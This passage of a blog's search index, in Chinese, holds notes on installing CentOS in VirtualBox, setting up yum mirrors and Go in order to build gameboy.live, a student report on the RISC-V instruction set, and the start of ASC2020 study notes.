VirtualBox\u5b89\u88c5CentOS","text":"<p>\u9700\u8981\u9009\u62e9\u5b89\u88c5\u90a3\u4e9b\u8f6f\u4ef6\uff08\u9ed8\u8ba4\u662fminimalist)\uff0c\u6211\u9009\u62e9\u4e86\u624b\u52a8\uff0c\u7136\u540e\u9009\u62e9\u4e86\u7f51\u7edc\u76f8\u5173\u7684\uff08\u9ed8\u8ba4\u6709sshd)\u3002\u7136\u540e\u8bbe\u7f6eroot\u5bc6\u7801\uff0c\u65b0\u5efa\u521d\u59cb\u8d26\u6237\u3002</p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#3-\u914d\u7f6e\u6362\u6e90","title":"3. \u914d\u7f6e\uff08\u6362\u6e90\uff09","text":"<ol> <li> <p>\u53d1\u73b0\u521a\u5b89\u88c5\u7684centos\u6ca1\u529e\u6cd5\u4f7f\u7528yum\uff08repository\u6ca1\u6709\u914d\u7f6e\u597d\uff09\u3002\u627e\u5230\u5982\u4f55\u6362\u6e90\u7684\u65b9\u6cd5\uff0c\u4e3b\u8981\u5206\u4e3a\u672c\u5730\u6e90\uff08iso\u955c\u50cf\u91cc\u6709\u4e00\u4e2aPackages\uff0c\u5305\u542b\u5b98\u65b9\u7684\u6240\u6709\u8f6f\u4ef6(rpm\u5305)\uff0c10000\u4e2a\u5de6\u53f3\uff09\u548c\u7f51\u7edc\u6e90\u3002</p> </li> <li> <p>\u5148\u5b89\u88c5\u4e0bVBox\u6269\u5c55\uff0c</p> </li> </ol> <pre><code>mkdir /mnt/cdrom\nmount /dev/cdrom /mnt/cdrom\ncd /mnt/cdrom\n./VBoxLinuxAdditions.run (\u4e2d\u9014\u4f1a\u7f16\u8bd1)\n</code></pre> <p>\u4e4b\u540e\u53ef\u4ee5\u8bbe\u7f6e\u5171\u4eab\u6587\u4ef6\u5939\uff0c\u526a\u5207\u677f\u7b49\u3002</p> <ol> <li> <p>\u5b89\u88c5\u672c\u5730\u6e90\uff1a</p> </li> <li> <p>\u6302\u8f7dcentos\u7cfb\u7edf\u955c\u50cf\uff08everything\u90a3\u4e2a\uff09:</p> <p>\u5148\u5728\u865a\u62df\u673a\u8bbe\u7f6e\u91cc\u5b58\u50a8\uff0cIDE\u63a7\u5236\u5668\u90a3\u5206\u914d\u5149\u9a71\uff0c\u628aiso\u6dfb\u52a0\u8fdb\u53bb\u3002</p> <pre><code>mkdir /media/cdrom\nmount /dev/cdrom /media/cdrom\n</code></pre> </li> <li> <p>\u4fee\u6539\u6e90\u914d\u7f6e\u6587\u4ef6</p> <ul> <li> <p>/etc/yum.config\u5305\u542bmain\u914d\u7f6e\uff0c\u5728/etc/yum.repos.d/\u4e0b\u4e3a\u5404\u79cd\u6e90\uff08\u672c\u5730\u6e90CentOS-Media.repo\uff0c\u7f51\u7edc\u6e90CentOS-Base.repo\uff09</p> </li> <li> <p>\u7531\u4e8e/media/cdrom\u5df2\u7ecf\u5728baseurl\u91cc\u6709\u4e86\uff0c\u6545\u53ea\u9700\u5c06enabled\u8bbe\u4e3a1\u5373\u53ef</p> </li> <li> <p>\u5c06CenOS-Base.repo\u91cd\u547d\u540d\u4e3a\u5176\u5b83</p> </li> </ul> </li> <li> <p>\u4f7f\u4e4b\u751f\u6548</p> <pre><code>yum clean all\nyum makecache\n</code></pre> <p>\u6109\u5feb\u5730\u5b89\u88c5vim, git, python\u5427\u3002</p> <p>\u4e0d\u77e5\u9053\u5982\u4f55\u5b89\u88c5netstat\uff0cifconfig\uff1f\u76f4\u63a5yum search xxx\u4f1a\u544a\u8bc9\u4f60\u7b54\u6848\u3002</p> </li> <li> <p>\u8bbe\u7f6e\u955c\u50cf\u6e90</p> </li> </ol> <p>\u963f\u91cc\u4e91\u955c\u50cf\u6bd4\u8f83\u9f50\u5168\uff0c\u4e14\u6709\u5e2e\u52a9\u6587\u6863\u3002 https://developer.aliyun.com/mirror/ </p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#4-\u914d\u7f6egameboylive","title":"4 \u914d\u7f6egameboy.live","text":"","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#1-\u5b89\u88c5golang","title":"1. \u5b89\u88c5golang","text":"<p>yum install \u4f1a\u663e\u793a\u6ca1\u6709golang\uff0c\u6216\u8005\u7248\u672c\u4e0d\u591f\u65b0</p> <p>\u5728\u5b98\u7f51\u4e0a\u6709\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684golang\uff0c\u76f4\u63a5\u4e0b\u8f7d\u89e3\u538b\u5c31\u53ef\u4ee5\u4f7f\u7528\u3002</p> <pre><code>wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz\nsudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz\n\u6dfb\u52a0PATH\u53d8\u91cf\n\ngo version #\u67e5\u770b\u7248\u672c\n</code></pre> <p>tips: \u5173\u4e8elinux\u5b89\u88c5\u8def\u5f84\uff1a</p> <ul> <li>/usr\u76ee\u5f55\u4e0b\u4e3a\u7cfb\u7edf\u8f6f\u4ef6\u76ee\u5f55\uff0c\u6709/usr/bin, /usr/lib\u7b49\u6587\u4ef6\u5939\u3002\u76f8\u5f53\u4e8ewindows\u7684C://windows/</li> <li>/usr/local\u4e3a\u7528\u6237\u8f6f\u4ef6\u76ee\u5f55\uff0c\u4e5f\u6709/usr/local/bin, /usr/local/lib\u7b49\u3002\u7528\u6237\u5b89\u88c5\u7684\u8f6f\u4ef6\u9ed8\u8ba4\u4f1a\u5b89\u88c5\u5728\u8fd9\u91cc\u3002\u76f8\u5f53\u4e8eC://Program Files/</li> <li>/opt\uff0c\u4ee3\u8868\u53ef\u9009\u8f6f\u4ef6\uff0c\u5982firefox\u7b49\u72ec\u7acb\u7684\u5927\u578b\u8f6f\u4ef6\u53ef\u4ee5\u5b89\u88c5\u5728\u8fd9\u91cc\u3002\u76f8\u5f53\u4e8eD://</li> </ul>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#2-\u914d\u7f6egolang\u4ee3\u7406","title":"2. \u914d\u7f6egolang\u4ee3\u7406","text":"<p>\u76f4\u63a5go get\u5f88\u5bb9\u6613\u8d85\u65f6\u3002</p> <pre><code>go env -w GO111MODULE=on\ngo env -w GOPROXY=https://goproxy.cn,direct\n</code></pre> <p>\u53ef\u4ee5\u67e5\u770bhttps://goproxy.cn\u5b98\u7f51\u4ecb\u7ecd</p>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#3-\u5b89\u88c5x11","title":"3. \u5b89\u88c5x11","text":"<p>\u76f4\u63a5go\u7f16\u8bd1gameboy.live\u4f1a\u62a5\u5404\u79cd.h\u6587\u4ef6\u627e\u4e0d\u5230\u3002\u4ee5\u4e0b</p> <pre><code># https://github.com/go-gl/glfw\n...\n\nyum install libX11-devel libXcursor-devel libXrandr-devel libXinerama-devel mesa-libGL-devel libXi-devel\n\n\n# github.com/hajimehoshi/oto\n../../go/pkg/mod/github.com/hajimehoshi/oto@v0.3.1/driver_linux.go:23:28: fatal error: alsa/asoundlib.h: No such file or directory\n\nyum install alsa-lib-devel (ubuntu\u4e0b\u7684\u5b89\u88c5libasound2\u5c31\u597d\u4e86\uff0cyum\u4e0b\u597d\u4e0d\u5bb9\u6613\u624d\u627e\u5230\u53ef\u4ee5\u5b89\u88c5\u8fd9\u4e2a\u4ee3\u66fflibasound2\u3002)\n</code></pre>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#4-\u8fd0\u884c","title":"4. \u8fd0\u884c","text":"<ul> <li> <p>\u53d1\u73b0\u7531\u4e8emobaxterm\u81ea\u5e26x11server\uff0c\u56e0\u6b64\u5728\u963f\u91cc\u4e91\u4e0a\u8fd0\u884c\uff0c\u4fbf\u4f1a\u81ea\u52a8\u6253\u5f00\u56fe\u5f62\u7a97\u53e3\u3002</p> </li> <li> <p>\u53d1\u73b0\u5728putty\u4e0a\u53ef\u4ee5\u6b63\u786e\u663e\u793a\uff0c\u4f46\u6309\u952e\u53ea\u6709Enter\u8d77\u4f5c\u7528\uff0cctrl+z\u7b49\u53ef\u4ee5\u4ea7\u751fRight\u7684\u6548\u679c\u3002</p> </li> <li>\u5728VB\u865a\u62df\u673a\uff08\u65e0\u56fe\u5f62\u754c\u9762\uff09\u4e0a\u65e0\u6cd5\u6b63\u786e\u663e\u793a\u753b\u9762\u3002WSL\u4e0a\u4e5f\u4e0d\u884c\u3002</li> <li>\u5728ubuntu\u684c\u9762\u7248\u7684\u7ec8\u7aef\u53ef\u4ee5\u5b8c\u7f8e\u8fd0\u884c\u3002</li> </ul>","tags":["centos","gameboy"]},{"location":"%E6%8A%98%E8%85%BE/2020/02/02/2020-02-02-%E5%AE%89%E8%A3%85centos%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEgameboy.live%E8%AE%B0%E5%BD%95/#5-\u7ed3\u675fssh\u540e\u4e0d\u505c\u6b62\u8fd0\u884c","title":"5. \u7ed3\u675fssh\u540e\u4e0d\u505c\u6b62\u8fd0\u884c","text":"<p>https://blog.csdn.net/v1v1wang/article/details/6855552 </p>","tags":["centos","gameboy"]},{"location":"2020/01/07/2020-02-09-RISC-V-trend/","title":"RISC-V\u62a5\u544a","text":"<p>author: \u8ba1\u79d1\u5353\u8d8a\u73ed \u8881\u798f\u7131 20174260</p>","tags":["risc-v"]},{"location":"2020/01/07/2020-02-09-RISC-V-trend/#0-\u5bfc\u8a00","title":"0. \u5bfc\u8a00","text":"<p>RISC-V\u662f21\u4e16\u7eaa\u8bde\u751f\u7684\u4e00\u79cd\u5b8c\u5168\u5f00\u653e\u7684\u8ba1\u7b97\u673a\u7cbe\u7b80\u6307\u4ee4\u96c6\uff0c\u53ef\u5e94\u7528\u4e8e\u5c0f\u5230\u5d4c\u5165\u5f0f\u7cfb\u7edf\u5927\u5230\u9ad8\u6027\u80fd\u5904\u7406\u5668\u7b49\u5e7f\u6cdb\u9886\u57df\u3002RISC-V\u5145\u5206\u6c72\u53d6\u4e86\u8bb8\u591a\u6307\u4ee4\u96c6\u7684\u5b9e\u8df5\u7ecf\u9a8c\uff0c\u5177\u6709\u975e\u5e38\u591a\u7684\u4f18\u70b9\u3002\u5e76\u4e14\u5b83\u5b8c\u5168\u5f00\u653e\uff0c\u91c7\u7528BSD\u5f00\u6e90\u534f\u8bae\u2014\u2014\u5168\u4e16\u754c\u4efb\u4f55\u516c\u53f8\u3001\u5927\u5b66\u3001\u4e2a\u4eba\u90fd\u53ef\u4ee5\u81ea\u7531\u514d\u8d39\u5730\u4f7f\u7528RISC-V\u6307\u4ee4\u96c6\u6784\u5efa\u81ea\u5df1\u7684\u7cfb\u7edf\u3002</p> <p>\u672c\u62a5\u544a\u7b2c\u4e00\u90e8\u5206\u8bb2\u8ff0RISC-V\u7684\u51e0\u4e2a\u4e3b\u8981\u7279\u70b9\u4e0e\u4f18\u52bf\uff0c\u7b2c\u4e8c\u90e8\u5206\u4ecb\u7ecdRISC-V\u7684\u76ee\u524d\u5df2\u6784\u5efa\u5efa\u7684\u751f\u6001\u7cfb\u7edf\u3002\u6700\u540e\u4e00\u90e8\u5206\uff0c\u8c08\u8bbaRISC-V\u5728\u63a8\u52a8\u5f00\u6e90\u786c\u4ef6\u4e2d\u8d77\u5230\u7684\u4f5c\u7528\u3002</p>","tags":["risc-v"]},{"location":"2020/01/07/2020-02-09-RISC-V-trend/#1-risc-v\u7684\u7279\u70b9","title":"1. RISC-V\u7684\u7279\u70b9","text":"","tags":["risc-v"]},{"location":"2020/01/07/2020-02-09-RISC-V-trend/#11-\u6307\u4ee4\u96c6\u6a21\u5757\u5316","title":"1.1 \u6307\u4ee4\u96c6\u6a21\u5757\u5316","text":"<p>\u4ee5\u5f80\u7684\u6307\u4ee4\u96c6\u4e3a\u4e86\u5b9e\u73b0\u517c\u5bb9\uff0c\u5f80\u5f80\u91c7\u7528\u589e\u91cf\u6269\u5c55\u7684\u65b9\u6cd5\u3002\u5373\u65b0\u7684\u5904\u7406\u5668\u4e0d\u4ec5\u8981\u5b9e\u73b0\u65b0\u7684\u6269\u5c55\uff0c\u8fd8\u5fc5\u9700\u8981\u5b9e\u73b0\u8fc7\u53bb\u6240\u6709\u7684\u6269\u5c55\u3002\u5982\u5178\u578b\u7684x86\u67b6\u6784\uff0c\u5176\u4e2d\u8bb8\u591a\u6307\u4ee4\u65e9\u5df2\u5931\u6548\uff0c\u4f46\u4e3a\u4e86\u517c\u5bb9\u6027\u5374\u5fc5\u987b\u5b9e\u73b0\uff0c\u8fd9\u5bfc\u81f4\u786c\u4ef6\u5b9e\u73b0\u53d8\u5f97\u8d8a\u6765\u8d8a\u590d\u6742\u3002RISC-V\u6309\u7167\u529f\u80fd\u5c06\u6307\u4ee4\u96c6\u5206\u4e3a\u5f88\u591a\u4e2a\u6a21\u5757\u3002\u5176\u4e2dI\u6a21\u5757\u4e3a\u57fa\u7840\u6574\u578b\u6307\u4ee4\u96c6\uff0c\u8fd9\u662fRISC-V\u8981\u6c42\u5fc5\u987b\u5b9e\u73b0\u7684\u6307\u4ee4\u96c6\uff0c\u5e76\u4e14\u6c38\u8fdc\u4e0d\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u53ea\u8981\u5b9e\u73b0\u4e86\u8be5\u6307\u4ee4\u96c6\u4fbf\u53ef\u4ee5\u8fd0\u884c\u5b8c\u6574\u7684\u57fa\u4e8eRISC-V\u7684\u8f6f\u4ef6\u3002\u8fd9\u6837\uff0cRISC-V\u5728\u6269\u5c55\u65f6\u4fbf\u4e0d\u518d\u4f1a\u50cfx86\u90a3\u6837\u80cc\u4e0a\u6c89\u91cd\u7684\u5386\u53f2\u5305\u88f9\u3002\u7f16\u8bd1\u5668\u4e5f\u53ef\u4ee5\u5728\u4fdd\u8bc1\u517c\u5bb9\u7684\u57fa\u7840\u4e0a\uff0c\u6839\u636e\u5df2\u5b9e\u73b0\u7684\u6269\u5c55\uff0c\u9009\u62e9\u6027\u5730\u751f\u6210\u66f4\u9ad8\u6548\u7684\u4ee3\u7801\u3002</p>","tags":["risc-v"]},{"location":"2020/01/07/2020-02-09-RISC-V-trend/#12-\u56de\u907f\u4ee5\u5f80\u7684\u8bbe\u8ba1\u7f3a\u9677","title":"1.2 \u56de\u907f\u4ee5\u5f80\u7684\u8bbe\u8ba1\u7f3a\u9677","text":"<p>\u76ee\u524d\u4e3b\u6d41\u7684\u6307\u4ee4\u96c6\u6709x86, ARM, MIPS\u7b49\u3002\u5176\u4e2dx86\u4e3a\u590d\u6742\u6307\u4ee4\u96c6(RISC)\uff0c\u4e8e1978\u5e74\u8bde\u751f\u3002\u800cARM, MIPS\u4e3a\u7cbe\u7b80\u6307\u4ee4\u96c6(RISC)\uff0c\u90fd\u662f1986\u5e74\u8bde\u751f\u7684\u3002\u4ece\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u7684\u53d1\u5c55\u4e0a\u6765\u770b\uff0cRISC\u7531\u4e8e\u7b80\u6d01\u6027\uff0c\u80fd\u591f\u66f4\u52a0\u5145\u5206\u5730\u5229\u7528\u73b0\u4ee3\u5fae\u4f53\u7cfb\u7ed3\u6784\u4e2d\u7684\u6d41\u6c34\u7ebf\u3001\u5206\u652f\u9884\u6d4b\u3001cache\u7b49\u6280\u672f\uff0c\u56e0\u6b64\u6bd4CISC\u66f4\u52a0\u9ad8\u6548\u3002\u56e0\u6b64\uff0c\u8bde\u751f\u4e8e21\u4e16\u7eaa(2004)\u7684RISC-V\uff0c\u5fc5\u7136\u4e5f\u662f\u7cbe\u7b80\u6307\u4ee4\u96c6\u3002\u5e76\u4e14\uff0c\u7531\u4e8e\u6709\u4e86\u524d\u9762\u6307\u4ee4\u7684\u7ecf\u9a8c\uff0cRISC-V\u5438\u6536\u4e86\u4ee5\u5f80\u6307\u4ee4\u96c6\u7684\u4f18\u70b9\uff0c\u5e76\u56de\u907f\u4e86\u4ee5\u5f80\u6307\u4ee4\u96c6\u7684\u4e00\u4e9b\u7f3a\u9677\u3002\u4f18\u70b9\u5982\uff0cRISC-V\u670932\u4e2a\u901a\u7528\u5bc4\u5b58\u5668\uff0c\u6709\u4e13\u95e8\u76840\u5bc4\u5b58\u5668\u3002\u4f7f\u7528\u4e13\u95e8\u7684\u79fb\u4f4d\u6307\u4ee4\u6765\u5904\u7406\u79fb\u4f4d\u64cd\u4f5c\u3002\u4f7f\u7528load/store\u6307\u4ee4\u8bbf\u95ee\u5185\u5b58\u3002\u8df3\u8f6c\u6307\u4ee4\u4e0d\u4f7f\u7528\u6761\u4ef6\u7801\u3002\u7f3a\u9677\u5219\u5982\uff0cRISC-V\u5e9f\u5f03\u4e86MIPS\u4e2d\u7684\u5206\u652f\u5ef6\u8fdf\u69fd(\u6709\u5229\u4e8e\u67b6\u6784\u548c\u5b9e\u73b0\u7684\u5206\u79bb)\uff0c\u7acb\u5373\u6570\u53ea\u8fdb\u884c\u6709\u7b26\u53f7\u6269\u5c55\uff0c\u7b97\u6570\u8fd0\u7b97\u4e0d\u629b\u51fa\u5f02\u5e38(\u901a\u8fc7\u8f6f\u4ef6\u5224\u65ad)\uff0c\u66f4\u89c4\u6574\u7684\u6307\u4ee4\u683c\u5f0f\uff08\u6e90\u53ca\u76ee\u7684\u5b57\u6bb5\u4f4d\u7f6e\u56fa\u5b9a\uff09\uff0c\u6574\u6570\u4e58\u9664\u6cd5\u53ef\u9009(\u7b80\u5316\u4e86\u57fa\u7840\u5b9e\u73b0)\u3002</p>","tags":["risc-v"]},{"location":"2020/01/07/2020-02-09-RISC-V-trend/#13-\u5b8c\u5168\u5f00\u653e","title":"1.3 \u5b8c\u5168\u5f00\u653e","text":"<p>RISC-V\u91c7\u7528BSD\u5f00\u6e90\u534f\u8bae\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u81ea\u7531\u514d\u8d39\u5730\u4f7f\u7528RISC-V\u3002\u5176\u4ed6\u6307\u4ee4\u96c6\u5982x86\u662f\u5b8c\u5168\u95ed\u6e90\u7684\uff0c\u53ea\u6709intel\u548cAMD\u7b49\u5c11\u6570\u516c\u53f8\u80fd\u591f\u57fa\u4e8ex86\u67b6\u6784\u751f\u4ea7\u4ea7\u54c1\u3002\u800cARM\u548cMIPS\u90fd\u91c7\u7528\u6388\u6743\u7684\u65b9\u5f0f\uff0c\u901a\u8fc7\u5356\u6388\u6743\u7684\u65b9\u5f0f\u76c8\u5229\uff0c\u5176\u4e2dARM\u7684\u6388\u6743\u8d39\u5219\u5341\u5206\u6602\u8d35\u3002RISC-V\u5982\u4eca\u7531RISC-V\u57fa\u91d1\u4f1a\u7ef4\u62a4\uff0c\u4efb\u4f55\u516c\u53f8\u53ea\u8981\u613f\u610f\u6bcf\u5e74\u652f\u4ed8\u4e00\u7b14\u4f1a\u5458\u8d39\u5373\u53ef\u6210\u4e3a\u4f1a\u5458\uff0c\u4f1a\u5458\u53ef\u4ee5\u53c2\u4e0e\u5230RISC-V\u4e4b\u540e\u6807\u51c6\u7684\u5236\u5b9a\u4e2d\u3002RISC-V\u4e5f\u56e0\u6b64\u771f\u6b63\u6210\u4e3a\u4e00\u4e2a\u5f00\u653e\u7684\u6307\u4ee4\u96c6\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u4efb\u4f55\u4e00\u4e2a\u516c\u53f8\u7684\u8d77\u4f0f\u800c\u53d7\u5230\u5f71\u54cd\u3002</p>","tags":["risc-v"]},{"location":"2020/01/07/2020-02-09-RISC-V-trend/#2-risc-v\u7684\u751f\u6001","title":"2. RISC-V\u7684\u751f\u6001","text":"<p>\u4ee5\u4e0b\u5185\u5bb9\u5f15\u7528\u81ea\u5f00\u653e\u6307\u4ee4\u96c6\u4e0e\u5f00\u6e90\u82af\u7247\u8fdb\u5c55\u62a5\u544a-v1p1</p> <p>2011 \u5e74\uff0c\u52a0\u5dde\u5927\u5b66\u4f2f\u514b\u5229\u5206\u6821\u53d1\u5e03\u4e86\u5f00\u653e\u6307\u4ee4\u96c6 RISC-V\uff0c\u5e76\u5f88\u5feb\u5efa\u7acb\u8d77\u4e00\u4e2a\u5f00\u6e90\u8f6f\u786c\u4ef6\u751f\u6001\u7cfb\u7edf\u3002\u622a\u6b62 2019 \u5e74 1 \u6708\uff0c\u5df2\u6709\u5305\u62ec Google\u3001NVidia \u7b49\u5728\u5185\u7684 200 \u591a\u4e2a\u516c\u53f8\u548c\u9ad8\u6821\u5728\u8d44\u52a9\u548c\u53c2\u4e0e RISC-V \u9879\u76ee\u3002\u5176\u4e2d\uff0c\u90e8\u5206\u4f01\u4e1a\u5df2\u7ecf\u5f00\u59cb\u5c06 RISC-V \u96c6\u6210\u5230\u4ea7\u54c1\u4e2d\u3002\u4f8b\u5982\u5168\u7403\u7b2c\u4e00\u5927\u786c\u76d8\u5382\u5546\u897f\u90e8\u6570\u636e\uff08Western Digital\uff09\u6700\u8fd1\u5ba3\u5e03\u5c06\u628a\u6bcf\u5e74\u5404\u7c7b\u5b58\u50a8\u4ea7\u54c1\u4e2d\u5d4c\u5165\u7684 10 \u4ebf\u4e2a\u5904\u7406\u5668\u6838\u6362\u6210 RISC-V\uff1bGoogle \u5229\u7528 RISC-V \u6765\u5b9e\u73b0\u4e3b\u677f\u63a7\u5236\u6a21\u5757\uff1bNVidia \u4e5f\u5c06\u5728 GPU \u4e0a\u5f15\u5165 RISC-V \u7b49\u3002\u6b64\u5916\uff0c\u56fd\u5185\u963f\u91cc\u5df4\u5df4\u3001\u534e\u4e3a\u3001\u8054\u60f3\u7b49\u516c\u53f8\u90fd\u5728\u9010\u6b65\u7814\u7a76\u5404\u81ea\u7684RISC-V \u5b9e\u73b0\uff1b\u4e0a\u6d77\u5e02\u5c06 RISC-V \u5217\u4e3a\u91cd\u70b9\u6276\u6301\u9879\u76ee\uff1b\u5370\u5ea6\u653f\u5e9c\u4e5f\u6b63\u5728\u5927\u529b\u8d44\u52a9\u57fa\u4e8e RISC-V \u7684\u5904\u7406\u5668\u9879\u76ee\uff0c\u4f7f RISC-V \u6210\u4e3a\u4e86\u5370\u5ea6\u7684\u4e8b\u5b9e\u56fd\u5bb6\u6307\u4ee4\u96c6\u3002</p> <p>\u7531\u6b64\u53ef\u89c1\uff0cRISC-V\u56fd\u5185\u5916\u7684\u5174\u8d77\u4f7f\u5f97\u76ee\u524dRISC-V\u7684\u751f\u6001\u5df2\u7ecf\u6bd4\u8f83\u5b8c\u5584\u4e86\u3002</p>","tags":["risc-v"]},{"location":"2020/01/07/2020-02-09-RISC-V-trend/#3-\u4e4b\u4e8e\u6784\u5efa\u5f00\u653e\u786c\u4ef6\u751f\u6001\u7684\u610f\u4e49","title":"3. \u4e4b\u4e8e\u6784\u5efa\u5f00\u653e\u786c\u4ef6\u751f\u6001\u7684\u610f\u4e49","text":"<p>2019 \u5e74\u5ea6\u56fd\u9645\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u65d7\u8230\u4f1a\u8bae ISCA \u4e8e 6 \u6708\u5728\u7f8e\u56fd\u4e9a\u5229\u6851\u90a3\u5dde\u51e4\u51f0\u57ce\u53ec\u5f00\uff0c\u4f1a\u8bae\u7684\u4e3b\u9898\u5373\u662f\u201c \u9762\u5411\u4e0b\u4e00\u4ee3\u8ba1\u7b97\u7684\u654f\u6377\u5f00\u653e\u786c\u4ef6\uff08Agile and Open Hardware for Next-Generation Computing \uff09\u201d\u3002\u7531\u6b64\u53ef\u89c1\u5f00\u653e\u786c\u4ef6\uff0c\u654f\u6377\u5f00\u53d1\u5df2\u6210\u4e3a\u672a\u6765\u7684\u8d8b\u52bf\u3002\u800cRISC-V\u5219\u521a\u597d\u6210\u4e3a\u8fd9\u8d8b\u52bf\u4e2d\u4e0d\u53ef\u6216\u7f3a\u7684\u4e00\u73af\u3002</p> <p>\u76ee\u524d\u5f00\u6e90\u786c\u4ef6\u5f00\u53d1\u4e2d\u9762\u4e34\u77404\u4e2a\u5173\u952e\u95ee\u9898(Yungang Bao, Chinese Academy of Sciences, The Four Steps to An Open-Source Chip Design Ecosystem)\uff1a</p> <ol> <li>\u5f00\u653e\u7684\u6307\u4ee4\u96c6ISA/\u5f00\u6e90IPs/\u5f00\u6e90Socs</li> <li>\u786c\u4ef6\u63cf\u8ff0\u8bed\u8a00Lanuages/\u5f00\u6e90\u7684EDA\u5de5\u5177</li> <li>\u9a8c\u8bc1\u548c\u4eff\u771fVertification/Simulation</li> <li>OS/Complier</li> </ol> <p>RISC-V\u4fbf\u5904\u4e8e\u7b2c\u4e00\u73af\u4e2d\uff0c</p> <p>\u867d\u7136\u76ee\u524d\u6bcf\u4e2a\u73af\u8282\u90fd\u8fd8\u672a\u5b8c\u5168\u89e3\u51b3\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u76f8\u4fe1\uff0c\u5728\u672a\u6765\uff0c\u5f00\u53d1\u786c\u4ef6\u53ef\u4ee5\u50cf\u5f00\u53d1\u4e00\u4e2a\u8f6f\u4ef6\u4e00\u6837\u3002\u5145\u5206\u5229\u7528\u5df2\u5f00\u6e90\u7684\u8d44\u6e90\uff0c\u7528\u6237\u53ea\u9700\u8981\u5b9a\u523610%\u4ee5\u5185\u7684\u4ee3\u7801\uff0c\u4fbf\u53ef\u4ee5\u4ee5\u6708\u4e3a\u5355\u4f4d\u5f00\u53d1\u51fa\u5ba2\u5236\u5316\u7684\u786c\u4ef6\u7cfb\u7edf\u3002</p>","tags":["risc-v"]},{"location":"2020/01/07/2020-02-09-RISC-V-trend/#4-\u53c2\u8003\u8d44\u6599","title":"4. \u53c2\u8003\u8d44\u6599","text":"<p>\u5927\u9053\u81f3\u7b80\u2014\u2014RISC-V\u67b6\u6784\u4e4b\u9b42\uff08\u4e0a\uff09</p> <p>\u5927\u9053\u81f3\u7b80\u2014\u2014RISC-V\u67b6\u6784\u4e4b\u9b42\uff08\u4e2d\uff09</p> <p>\u5927\u9053\u81f3\u7b80\u2014\u2014RISC-V\u67b6\u6784\u4e4b\u9b42\uff08\u4e0b\uff09</p> <p>\u5f00\u653e\u6307\u4ee4\u96c6\u4e0e\u5f00\u6e90\u82af\u7247\u8fdb\u5c55\u62a5\u544a-v1p1\uff082019-02-22\u66f4\u65b0\uff09</p> <p>\u8fdc\u666f\u7814\u8ba8\u4f1a\u7eaa\u8981\u2013\u9762\u5411\u4e0b\u4e00\u4ee3\u8ba1\u7b97\u7684\u5f00\u6e90\u82af\u7247\u4e0e\u654f\u6377\u5f00\u53d1</p>","tags":["risc-v"]},{"location":"%E4%B8%AA%E4%BA%BA/2020/02/09/2020-02-09-Vacation-routine-ASC2020-tips-up-to-02-09/","title":"Vacation routine: ASC2020 tips (up to 02/09)","text":"<p>\u8bb0\u5f55\u4e86\u8fd9\u4e48\u591a\u5929\u5f04ASC2020\u5b66\u5230\u7684\u4e00\u4e9b\u77e5\u8bc6\uff0c\u539f\u672c\u8bb0\u5f55\u5728txt\u91cc:-)\uff0c\u56e0\u6b64\u6709\u70b9\u4e11\u3002</p> <pre><code>1/28\n1. apt unmet dependency (depend: xxx but not going to install) \u9519\u8bef\u7684\u53ef\u80fd\u539f\u56e0\u3002\n2. virtualbox \u7684\u5b89\u88c5\u589e\u5f3a\u529f\u80fd\u53ef\u4ee5\uff1a1\uff09\u63d0\u9ad8\u5206\u8fa8\u7387\uff1b2\uff09\u526a\u5207\u677f\u5171\u4eab\uff1b3\uff09\u5171\u4eab\u6587\u4ef6\u5939\n         \u4ee5\u53ca\u5982\u4f55\u547d\u4ee4\u884c\u624b\u52a8\u5b89\u88c5\uff1a1\uff09\u70b9\u51fb\u83dc\u5355\u680f\u91cc\u7684\u5b89\u88c5\u589e\u5f3a\u529f\u80fd\u4f1a\u5c06\u542b\u6709addition...iso\u955c\u50cf\u7684cdrom\u52a0\u8f7d\u3002\n            2\uff09mount /dev/cdrom \u5230\u4e00\u4e2a\u6302\u8f7d\u70b9\uff0c\u63a8\u8350/mnt/cdrom\uff08\u5373mount /dev/cdrom /mnt/cdrom\uff09\uff0c\u5176\u4e2dcdrom\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u521b\u5efa\u3002\n            3\uff09\u5728\u6302\u8f7d\u70b9 